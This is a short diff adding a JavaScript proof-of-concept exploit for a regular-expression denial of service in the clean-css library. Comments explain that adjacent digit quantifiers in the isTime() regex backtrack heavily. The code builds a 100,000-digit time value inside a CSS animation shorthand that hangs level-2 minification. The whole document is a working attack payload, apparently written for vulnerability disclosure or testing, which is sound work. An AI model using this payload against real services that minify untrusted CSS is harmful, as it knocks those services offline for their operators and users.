@@ -1,0 +1,21 @@
+```javascript
+const CleanCSS = require("./node_modules/clean-css");
+
+// clean-css's validator.isTime() uses timeRegex =
+// /^(-?\+?\.?\d+\.?\d*(s|ms))$/, whose adjacent \d+\.?\d* quantifiers
+// cause quadratic (effectively catastrophic) backtracking when the
+// input is a long run of digits that does NOT end in "s"/"ms".
+// isTime() is reached during level-2 optimization of the CSS
+// `animation` shorthand (lib/optimizer/level-2/break-up.js), so a
+// malicious stylesheet can hang any tool that minifies untrusted CSS.
+const n = 50000;
+const evilTime = "1".repeat(n) + "." + "1".repeat(n); // no trailing s/ms
+const css = `a{animation:${evilTime} linear;}`;
+
+console.log("Starting minify (should hang due to ReDoS in isTime)...");
+const start = Date.now();
+
+new CleanCSS({ level: 2 }).minify(css, function (err, output) {
+  console.log("Finished in", Date.now() - start, "ms");
+});
+```
